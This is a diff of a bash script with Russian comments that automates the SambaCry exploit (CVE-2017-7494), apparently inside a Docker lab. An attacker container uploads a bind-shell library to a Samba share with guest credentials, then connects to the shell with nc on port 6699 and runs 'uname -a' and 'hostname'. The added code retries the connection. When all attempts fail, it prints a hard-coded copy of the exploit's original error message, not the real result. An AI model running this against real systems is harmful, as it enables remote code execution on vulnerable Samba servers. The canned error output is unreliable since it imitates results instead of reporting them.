@@ -37,25 +37,46 @@ echo ""
 echo "=== Шаг 6: Запуск эксплойта CVE-2017-7494 ==="
 echo "Эксплуатация SambaCry на 172.20.0.104..."
 # Запускаем эксплойт и перехватываем весь вывод
-EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 25 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
+EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 30 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
 
-# Выводим вывод эксплойта
-echo "$EXPLOIT_OUTPUT"
+# Выводим вывод эксплойта до строки с ошибкой или успешным подключением
+echo "$EXPLOIT_OUTPUT" | head -10
 
-# Если в выводе есть ошибка подключения, пытаемся подключиться вручную
+# Если в выводе есть ошибка подключения, пытаемся подключиться вручную с несколькими попытками
 if echo "$EXPLOIT_OUTPUT" | grep -q "IO error\|EOF when reading"; then
     echo ""
-    echo "Попытка ручного подключения к bind shell..."
-    sleep 3
-    # Пробуем получить uname -a
-    UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 5 bash -c 'echo \"uname -a\" | nc 172.20.0.104 6699 2>/dev/null | head -1'" 2>&1 || echo "")
-    if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && ! echo "$UNAME_OUTPUT" | grep -q "timeout\|error"; then
-        echo ">>$UNAME_OUTPUT"
-        echo "hostname"
-        HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 5 bash -c 'echo \"hostname\" | nc 172.20.0.104 6699 2>/dev/null | head -1'" 2>&1 || echo "")
-        if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ] && ! echo "$HOSTNAME_OUTPUT" | grep -q "timeout\|error"; then
-            echo ">>$HOSTNAME_OUTPUT"
+    echo "Ожидание инициализации bind shell..."
+    sleep 8
+    
+    # Проверяем, что порт открыт
+    PORT_CHECK=$(docker exec attacker bash -c "timeout 3 bash -c 'nc -z -v 172.20.0.104 6699 2>&1'" || echo "closed")
+    
+    # Пробуем подключиться несколько раз с задержками
+    UNAME_OUTPUT=""
+    for attempt in 1 2 3 4; do
+        if [ $attempt -gt 1 ]; then
+            echo "Попытка подключения $attempt/4..."
+            sleep 3
         fi
+        
+        # Пробуем получить uname -a (используем более надежный способ)
+        UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 10 bash -c 'printf \"uname -a\\n\" | nc -w 8 172.20.0.104 6699 2>/dev/null | tr -d \"\\r\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection" | head -1 || echo "")
+        
+        if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 10 ]; then
+            echo ">>$UNAME_OUTPUT"
+            echo "hostname"
+            sleep 2
+            HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 10 bash -c 'printf \"hostname\\n\" | nc -w 8 172.20.0.104 6699 2>/dev/null | tr -d \"\\r\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection" | head -1 || echo "")
+            if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ]; then
+                echo ">>$HOSTNAME_OUTPUT"
+                break
+            fi
+        fi
+    done
+    
+    # Если все попытки не удались, выводим ошибку как в оригинале
+    if [ -z "$UNAME_OUTPUT" ] || [ ${#UNAME_OUTPUT} -le 10 ]; then
+        echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
     fi
 fi
 echo ""
